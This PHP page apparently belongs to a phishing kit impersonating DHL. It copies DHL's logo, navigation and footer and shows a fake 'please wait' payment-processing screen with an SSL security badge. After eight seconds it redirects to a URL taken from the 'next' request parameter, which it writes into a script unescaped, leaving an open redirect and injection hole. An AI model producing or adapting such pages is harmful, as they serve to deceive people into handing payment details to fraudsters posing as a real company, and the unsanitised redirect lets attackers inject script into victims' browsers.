<?php 
require '../main.php';
?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $langs['title']; ?></title>
    <link rel="stylesheet" href="res/app.css">
</head>
<body>
<header>
    <div class="header">
        <div class="container">
            <div class="left">
                <img src="res/logo.png">
            </div>
            <div class="right">
                <span><?php echo $langs['help_support']; ?></span>
            </div>
        </div>
    </div>
    <div class="header">
        <div class="container links" style="display:inline-block;">
            <span><?php echo $langs['home']; ?></span>
            <span><?php echo $langs['ship']; ?></span>
            <span><?php echo $langs['track']; ?></span>
        </div>
    </div>
</header>



<main>
<div class="container" style="text-align:center;">
<div class="form">
<div class="title"><?php echo $langs['please_wait']; ?></div>
<div class="text"><?php echo $langs['do_not_leave']; ?></div>

<div class="col">
<img src="res/loading.gif" style="width:120px;">
</div>




<div class="col methods" style="margin:50px 0;">
                <img src="res/methods.png">
                <h4 style="color:green;"><?php echo $langs['ssl_security']; ?></h4>
                <p style="font-size:0.8em;"><?php echo $langs['payment_security_notice']; ?></p>
            </div>
        </div>
    </div>
</main>

<footer>
    <div class="container">
        <div class="rows">
            <div class="cola">
                <span><img src="res/footer.png"></span>
                <span><?php echo $langs['about_dhl']; ?></span>
                <span><?php echo $langs['press']; ?></span>
                <span><?php echo $langs['careers']; ?></span>
                <span><?php echo $langs['legal_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['alerts']; ?></span>
                <span><?php echo $langs['fraud_awareness']; ?></span>
                <span><?php echo $langs['important_information']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['legal']; ?></span>
                <span><?php echo $langs['terms_conditions']; ?></span>
                <span><?php echo $langs['privacy_notice']; ?></span>
            </div>

            <div class="cola">
                <span class="legend"><?php echo $langs['contact_support']; ?></span>
                <span><?php echo $langs['help_support']; ?></span>
                <span><?php echo $langs['faqs']; ?></span>
                <span><?php echo $langs['contact_us']; ?></span>
                <span><?php echo $langs['find_location']; ?></span>
            </div>
        </div>
    </div>
</footer>


<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
<script>
setTimeout(() => {
    window.location="<?php echo @$_GET['next']; ?>";
}, 8000);
</script>
</body>
</html>